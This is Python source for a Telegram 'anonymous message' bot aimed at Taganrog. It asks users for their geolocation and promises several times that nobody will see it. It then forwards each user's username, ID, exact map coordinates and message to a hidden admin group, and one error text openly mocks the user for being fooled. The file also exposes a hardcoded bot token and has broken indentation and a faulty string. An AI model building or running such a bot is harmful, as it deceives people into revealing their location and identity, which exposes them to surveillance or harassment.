
import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from math import radians, sin, cos, sqrt, atan2

# Конфигурация
TOKEN = "8089566253:AAGJSzNBhjgoEK5ZolkgIqH8a8Q99iPuu44"
ANON_GROUP_LINK = "https://t.me/+Ql0IZosRRu82YTQy"
ANON_GROUP_ID = -1002514617765
FORWARD_GROUP_ID = -1002698558394
VIDEO_LINK = "https://youtu.be/hK_cbdVPK-E"  # Новая переменная с видео

# Геопараметры Таганрога
TAGANROG_CENTER = (47.2364, 38.8953)
ALLOWED_RADIUS_KM = 50

# Настройка логов
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    filename='bot.log'
)
logger = logging.getLogger(__name__)

# Клавиатура для запроса гео
geo_keyboard = ReplyKeyboardMarkup(
    [[KeyboardButton("📍 Отправить геолокацию", request_location=True)]],
    resize_keyboard=True,
    one_time_keyboard=True
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Приветственное сообщение с уточнением о конфиденциальности"""
    welcome_text = (
        f"Привет! Для отправки сообщения сначала поделись своей геолокацией:\n\n"
        f"🔒 <b>Конфиденциальность:</b>Никто не получит твою геопозицию (антиспам система)\n\n"
        f"📹 <a href='{VIDEO_LINK}'>Видеоинструкция</a>"
    )
await update.message.reply_text(
        welcome_text,
        reply_markup=geo_keyboard,
        parse_mode='HTML',
        disable_web_page_preview=True
    )

def calculate_distance(lat1, lon1, lat2, lon2):
    """Вычисление расстояния между точками (в км)"""
    R = 6371
    lat1, lon1, lat2, lon2 = map(radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = sin(dlat/2)**2 + cos(lat1) * cos(lat2) * sin(dlon/2)**2
    return R * (2 * atan2(sqrt(a), sqrt(1-a)))

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка геолокации с подтверждением конфиденциальности"""
    try:
        user = update.message.from_user
        location = update.message.location
        
        # Вычисляем расстояние
        distance = calculate_distance(
            TAGANROG_CENTER[0], TAGANROG_CENTER[1],
            location.latitude, location.longitude
        )
        
        # Сохраняем данные
        context.user_data['location'] = {
            'lat': location.latitude,
            'lon': location.longitude,
            'distance': distance,
            'valid': distance <= ALLOWED_RADIUS_KM
        }
        
        # Ответ с подтверждением конфиденциальности
        response = (
            "✅ <b>Геолокация принята</b>\n\n"
            f"📏 Расстояние до центра: {distance:.1f} км\n"
        
            "Теперь отправьте текст сообщения:"
        )
        
        await update.message.reply_text(
            response,
            reply_markup=ReplyKeyboardMarkup.remove_keyboard(),
            parse_mode='HTML'
        )
        
    except Exception as e:
        logger.error(f"Ошибка обработки геолокации: {e}")
        await update.message.reply_text(
            "❌ Ошибка обработки геолокации. Пожалуйста, попробуйте еще раз(наебал все ок).\n\n"
            ,
            reply_markup=geo_keyboard
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка сообщений с напоминанием о конфиденциальности"""
    try:
        if update.message.chat.type != "private":
            return
            
        # Проверяем наличие геолокации
        if 'location' not in context.user_data:
            await update.message.reply_text(
                "⚠️ Сначала подтвердите ваше местоположение:\n\n"
                "🔒 Никто не увидит вашу геопозицию",
                reply_markup=geo_keyboard
            )
            return
            
        user = update.message.from_user
        loc_data = context.user_data['location']
        
        # Формируем сообщение для админов
        admin_msg = (
            f"👤 Пользователь: @{user.username or 'N/A'} (ID: {user.id})\n"
            f"📍 Гео: https://maps.google.com/?q={loc_data['lat']},{loc_data['lon']}\n"
            f"📏 Расстояние: {loc_data['distance']:.1f} км\n\n"
            f"📝 Сообщение:\n{update.message.text}\n\n"
            f"📹 <a href='{VIDEO_LINK}'>Инструкция</a>"
        )
        
        # Отправляем админам
        await context.bot.send_message(
            FORWARD_GROUP_ID,
            admin_msg,
            parse_mode='HTML',
            disable_web_page_preview=True
        )
        
        # Отправляем в анонимный чат если в радиусе
        if loc_data['valid']:
            await context.bot.send_message(
                ANON_GROUP_ID,
                f"✉️ Анонимное сообщение:\n\n{update.message.text}",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Открыть", url=VIDEO_LINK)]])
            )
            response = "✅ Сообщение отправлено админам (@kmpr0 еслеч)! <a href='{VIDEO_LINK}'>Ахуетт</a>"
        else:
            response = "❌ Вы вне зоны Таганрога. Сообщение доступно только администраторам."
            
        await update.message.reply_text(response)
        
        # Сбрасываем геоданные
        del context.user_data['location']
        await update.message.reply_text(
            "Для нового сообщения отправьте геолокацию снова:\n\n",
            reply_markup=geo_keyboard
        )
        
    except Exception as e:
        logger.error(f"Ошибка обработки сообщения: {e}")
        await update.message.reply_text(
            "⚠️ Произошла ошибка.\n"
            "Пожалуйста, начните заново.",
            reply_markup=geo_keyboard
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок с гарантией конфиденциальности"""
    logger.error(f"Ошибка: {context.error}")
    if update and update.message:
        await update.message.reply_text(
            "⚠️ Техническая ошибка. Ваши данные в безопасности.\n"
            "Попробуйте позже или обратитесь к администратору.",
            reply_markup=geo_keyboard
        )

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_error_handler(error_handler)
    
    logger.info("Бот запущен ")
    app.run_polling()
